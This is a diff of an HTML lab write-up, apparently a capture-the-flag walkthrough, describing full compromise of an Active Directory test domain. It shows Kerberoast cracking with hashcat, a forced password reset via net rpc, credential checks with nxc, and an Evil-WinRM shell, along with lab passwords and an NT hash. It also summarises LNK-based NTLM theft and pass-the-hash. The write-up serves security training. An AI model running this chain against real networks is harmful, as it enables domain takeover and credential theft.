@@ -218,7 +218,7 @@
   </div>
 
   <h3>Scope and Objective</h3>
-  <p>As a penetration tester on the Hack Smarter Red Team, the objective is to achieve a full compromise of the Active Directory environment.</p>
+  <p>As a penetration tester on the Hack Smarter Pentesters team, the objective is to achieve a full compromise of the Active Directory environment.</p>
   <p><strong>Starting Point:</strong> A prior enumeration phase yielded a leaked database containing usernames and hashed passwords.</p>
   <p><strong>Goal:</strong> Leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve complete domain compromise.</p>
 
@@ -312,19 +312,19 @@ SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]</c
   <h3><span class="step">[Step 6]</span> Cracking the TGS Hash</h3>
   <p>I cracked the Kerberos TGS hash using hashcat:</p>
   <pre><code>$ hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
-$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$...:rubeushagrid</code></pre>
+$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$...:[REDACTED]</code></pre>
 
   <div class="note">
     <strong>What is hashcat -m 13100?</strong> Mode <code>13100</code> is for Kerberos 5 TGS-REP etype 23 (RC4) hashes. These are the hashes obtained from Kerberoasting attacks.
   </div>
 
   <div class="key-finding">
-    <strong>New Credentials:</strong> <code>r.haggard:rubeushagrid</code>
+    <strong>New Credentials:</strong> <code>r.haggard:[REDACTED]</code>
   </div>
 
   <p>Validated access:</p>
-  <pre><code>$ nxc ldap 10.1.167.230 -u r.haggard -p rubeushagrid
-LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:rubeushagrid</code></pre>
+  <pre><code>$ nxc ldap 10.1.167.230 -u r.haggard -p '[REDACTED]'
+LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:[REDACTED]</code></pre>
 
   <h3><span class="step">[Step 7]</span> ForceChangePassword Abuse</h3>
   <p>BloodHound revealed that <code>r.haggard</code> has the <code>ForceChangePassword</code> permission over <code>h.potch</code>:</p>
@@ -339,10 +339,10 @@ LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:rubeushagrid</c
   </div>
 
   <p>I used <code>net rpc</code> to change h.potch's password:</p>
-  <pre><code>$ net rpc password 'h.potch' 'Zerotrace123!' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
+  <pre><code>$ net rpc password 'h.potch' '[REDACTED]' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'[REDACTED]' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
 
   <p>Validated the new credentials:</p>
-  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p 'Zerotrace123!'
+  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p '[REDACTED]'
 SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\h.potch:[REDACTED]</code></pre>
 
   <div class="key-finding">
@@ -516,18 +516,8 @@ SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:[REDACTED]</code>
   <pre><code>*Evil-WinRM* PS C:\Users\a.flatch\Documents> type C:\Users\Administrator\Desktop\root.txt
 9557e6</code></pre>
 
-  <h2>Attack Chain Summary</h2>
+  <h2>Attack Path Summary</h2>
   <div class="attack-chain">
-    <ol>
-      <li><strong>Password Cracking:</strong> Cracked leaked MD5 hashes to obtain r.widdleton credentials</li>
-      <li><strong>Kerberoasting:</strong> Extracted and cracked r.haggard TGS hash</li>
-      <li><strong>ForceChangePassword:</strong> Reset h.potch password via r.haggard privileges</li>
-      <li><strong>NTLM Theft:</strong> Captured h.grangon hash via malicious LNK file</li>
-      <li><strong>WinRM Access:</strong> Gained shell as h.grangon (Remote Management Users)</li>
-      <li><strong>SeBackupPrivilege:</strong> Extracted SAM/SYSTEM hives for local hashes</li>
-      <li><strong>Pass-the-Hash:</strong> Authenticated as a.flatch using local Admin hash</li>
-      <li><strong>Domain Compromise:</strong> Full domain admin access achieved</li>
-    </ol>
     <pre><code>Leaked DB -> r.widdleton (password crack)
     |
     v
@@ -549,6 +539,60 @@ Pass-the-Hash -> a.flatch (Domain Admin)
 Domain Compromise</code></pre>
   </div>
 
+  <h2>Attack Chain Summary</h2>
+  <table class="credentials-table">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Account</th>
+        <th>Technique</th>
+        <th>Outcome</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>r.widdleton</td>
+        <td>MD5 hash cracking (leaked database)</td>
+        <td>Initial domain access</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>r.haggard</td>
+        <td>Kerberoasting (SPN-enabled account)</td>
+        <td>Lateral movement</td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>h.potch</td>
+        <td>ForceChangePassword abuse</td>
+        <td>AD permission exploitation</td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>h.grangon</td>
+        <td>NTLM theft via malicious LNK file</td>
+        <td>WinRM shell access</td>
+      </tr>
+      <tr>
+        <td>5</td>
+        <td>a.flatch</td>
+        <td>SeBackupPrivilege + Pass-the-Hash</td>
+        <td>Domain Admin compromise</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Critical Vulnerabilities Exploited</h3>
+  <ul>
+    <li>Weak passwords stored as unsalted MD5 hashes in leaked database</li>
+    <li>Kerberoastable service account with weak password</li>
+    <li>Misconfigured AD permissions (ForceChangePassword)</li>
+    <li>Writable file share enabling NTLM theft</li>
+    <li>SeBackupPrivilege assigned to non-admin user</li>
+    <li>Password reuse between local Administrator and domain user</li>
+  </ul>
+
   <h2>Credentials Summary</h2>
   <table class="credentials-table">
     <thead>
@@ -567,11 +611,11 @@ Domain Compromise</code></pre>
       <tr>
         <td>t.ren</td>
         <td><code>[REDACTED]</code></td>
-        <td>MD5 crack (not valid for domain)</td>
+        <td>MD5 crack (not valid for domain access)</td>
       </tr>
       <tr>
         <td>r.haggard</td>
-        <td><code>rubeushagrid</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>Kerberoasting</td>
       </tr>
       <tr>
@@ -586,7 +630,7 @@ Domain Compromise</code></pre>
       </tr>
       <tr>
         <td>a.flatch</td>
-        <td><code>[REDACTED]</code></td>
+        <td><code>520126a03f5d5a8d836f1c4f34ede7ce</code> (NT hash)</td>
         <td>SAM dump + password reuse</td>
       </tr>
     </tbody>
